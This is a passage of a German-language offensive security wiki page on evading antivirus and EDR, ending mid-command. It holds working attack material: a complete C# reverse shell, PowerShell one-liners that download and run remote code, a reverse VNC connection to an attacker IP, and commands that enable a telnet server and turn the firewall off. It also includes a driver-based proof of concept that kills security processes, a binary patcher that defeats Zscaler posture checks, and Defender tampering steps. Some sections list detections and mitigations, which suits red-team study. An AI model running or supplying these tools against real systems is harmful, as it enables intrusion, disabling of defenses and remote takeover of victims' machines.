SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz, das heißt, selten heruntergeladene Anwendungen lösen SmartScreen aus, wodurch der Endanwender gewarnt und daran gehindert wird, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads das Mark of The Web erhalten, besteht darin, sie in einem Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten erlaubt, **Ereignisse zu protokollieren**. Allerdings kann er auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** des Userspace-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne irgendwelche Ereignisse zu protokollieren. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Infos finden Sie in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist seit geraumer Zeit bekannt und ist immer noch eine sehr gute Möglichkeit, Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, es gibt jedoch verschiedene Wege, dies zu tun:

- **Fork\&Run**

Dabei wird **einen neuen Prozess (als Opferprozess) starten**, den bösartigen Post-Exploitation-Code in diesen neuen Prozess injizieren, den Code ausführen und nach Beendigung den neuen Prozess beenden. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses erfolgt. Das bedeutet, wenn bei unserer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, besteht eine **viel höhere Wahrscheinlichkeit**, dass unser **Implantat überlebt.** Der Nachteil ist, dass die **Wahrscheinlichkeit**, durch **Behavioural Detections** entdeckt zu werden, **höher** ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. Auf diese Weise kann man vermeiden, einen neuen Prozess zu erstellen und diesen von AV scannen zu lassen, aber der Nachteil ist, dass, wenn bei der Ausführung deiner Payload etwas schiefgeht, die **Wahrscheinlichkeit**, den **Beacon zu verlieren**, **viel größer** ist, da dieser abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, sieh dir bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff auf die Interpreter-Umgebung gewährt, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist.

Indem man Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo gibt an: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten reverse shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die einem Angreifer erlaubt, **das Zugriffstoken oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, wodurch dessen Rechte reduziert werden, sodass der Prozess nicht beendet wird, aber keine Berechtigungen mehr hat, um nach bösartigen Aktivitäten zu prüfen.

Um dies zu verhindern, könnte Windows **externen Prozessen** verbieten, Handles auf die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren und damit die Kontrolle zu übernehmen und Persistenz zu erreichen:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, der es erlaubt, die PIN ohne Verwendung der GUI zu setzen.)


## Advanced Evasion

Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in einem einzigen System berücksichtigen, daher ist es nahezu unmöglich, in ausgereiften Umgebungen vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in der Tiefe.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, welches **Teile des Binaries entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und es dir aufschlüsselt.\
Ein weiteres Tool, das dasselbe macht, ist [**avred**](https://github.com/dobin/avred) mit einer offenen Web-Anwendung, die den Dienst unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) anbietet.

### **Telnet Server**

Bis Windows10 wurde Windows standardmäßig mit einem **Telnet-Server** geliefert, den man (als Administrator) installieren konnte, indem:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es beim Systemstart **starten** und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (verwenden Sie die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führen Sie _**winvnc.exe**_ aus und konfigurieren Sie den Server:

- Aktivieren Sie die Option _Disable TrayIcon_
- Legen Sie ein Passwort bei _VNC Password_ fest
- Legen Sie ein Passwort bei _View-Only Password_ fest

Verschieben Sie dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er auf eine reverse **VNC connection** vorbereitet ist. Dann, auf dem **victim**: Starten Sie den winvnc-Daemon `winvnc.exe -run` und führen Sie `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unauffällig zu bleiben, dürfen Sie folgende Dinge nicht tun

- Starten Sie `winvnc` nicht, wenn es bereits läuft, sonst wird ein [popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfen Sie mit `tasklist | findstr winvnc`, ob es läuft
- Starten Sie `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führen Sie nicht `winvnc -h` aus, sonst wird ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starte den Lister** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** mit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR im Kernel Space ausschalten

Storm-2603 setzte ein kleines Konsolenprogramm namens **Antivirus Terminator** ein, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **own vulnerable but *signed* driver** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Key take-aways
1. **Signed driver**: Die auf die Festplatte abgelegte Datei ist `ServiceMouse.sys`, aber das Binary ist der legal signierte Treiber `AToolsKrnl64.sys` von Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem User-Land zugänglich wird.
3. **IOCTLs exposed by the driver**
| IOCTL code | Funktion                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beendet einen beliebigen Prozess per PID (wird verwendet, um Defender/EDR-Dienste zu beenden) |
| `0x990000D0` | Löscht eine beliebige Datei auf der Festplatte |
| `0x990001D0` | Entlädt den Treiber und entfernt den Service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel läuft, kann *protected* Prozesse öffnen, diese beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmaßnahmen.

Detection / Mitigation
•  Aktivieren Sie Microsofts Vulnerable-Driver-Blockliste (`HVCI`, `Smart App Control`), sodass Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem world-writable Verzeichnis geladen wird oder nicht auf der allow-list steht.  
•  Achten Sie auf User-Mode-Handles zu custom device objects, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** führt device-posture-Regeln lokal aus und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei Schwachstellen im Design machen eine vollständige Umgehung möglich:

1. Die Posture-Evaluierung findet **völlig clientseitig** statt (es wird nur ein Boolean an den Server gesendet).  
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binaries auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als compliant gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Unsigned oder modifizierte Binaries können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höher geschützte Prozesse sich gegenseitig manipulieren können. Angreifend: Wenn Sie eine PPL-aktivierte Binary legitim starten und deren Argumente kontrollieren können, lässt sich harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL unterstütztes Schreib-Primitive gegen geschützte Verzeichnisse verwandeln, die von AV/EDR genutzt werden.

Was bewirkt, dass ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Es muss ein kompatibles Protection-Level angefordert werden, das zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Levels führen zum Fehler bei der Erstellung.

Siehe auch eine weiterführende Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Helfer: CreateProcessAsPPL (wählt das Protection-Level und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsweise:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn als PPL-Prozess gestartet, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwende 8.3-Kurzpfade, um in normalerweise geschützte Orte zu zeigen.

8.3 short path helpers
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` mittels eines Launchers (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Log-Pfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Falls die Ziel-Binary normalerweise vom AV während der Ausführung geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten ein, bevor das AV startet, indem du einen Auto-Start-Service installierst, der verlässlich früher läuft. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Reboot erfolgt der PPL-gestützte Schreibvorgang, bevor das AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und der Start verhindert wird.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, außer der Platzierung nicht kontrollieren; das Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Administrator/SYSTEM, um einen Dienst zu installieren/zu starten und ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Datei-Locks.

Erkennungen
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders wenn als Kindprozess von nicht-standardmäßigen Startern parented, rund um den Boot.
- Neue Dienste, die so konfiguriert sind, dass verdächtige Binaries automatisch starten, und die konsistent vor Defender/AV starten. Untersuchen Sie Dienst-Erstellung/-Änderung vor Defender-Startfehlern.
- File-Integrity-Monitoring auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: Achten Sie auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und anomale PPL-Level-Nutzung durch Nicht-AV-Binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: Einschränken, welche signierten Binaries als PPL laufen dürfen und unter welchen Eltern; ClipUp-Aufrufe außerhalb legitimer Kontexte blockieren.
- Service-Hygiene: Einschränkung der Erstellung/Änderung von Autostart-Diensten und Überwachung von Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender Tamper Protection und Early-launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf Binärkorruption hinweisen.
- Erwägen Sie, die 8.3-Kurzname-Generierung auf Volumes, die Security-Tools hosten, zu deaktivieren, sofern mit Ihrer Umgebung kompatibel (gründlich testen).

Referenzen zu PPL und Tools
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, neu zu starten oder die Defender-Platform-Neuauswahl auszulösen (Service-Neustart beim Boot)
- Nur eingebaute Tools erforderlich (mklink)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber die Platform-Auswahl vertraut Verzeichnis-Einträgen und wählt die lexikographisch höchste Version, ohne zu validieren, dass das Ziel zu einem geschützten/vertrauten Pfad aufgelöst wird.

Schritt-für-Schritt (Beispiel)
1) Bereiten Sie einen beschreibbaren Klon des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
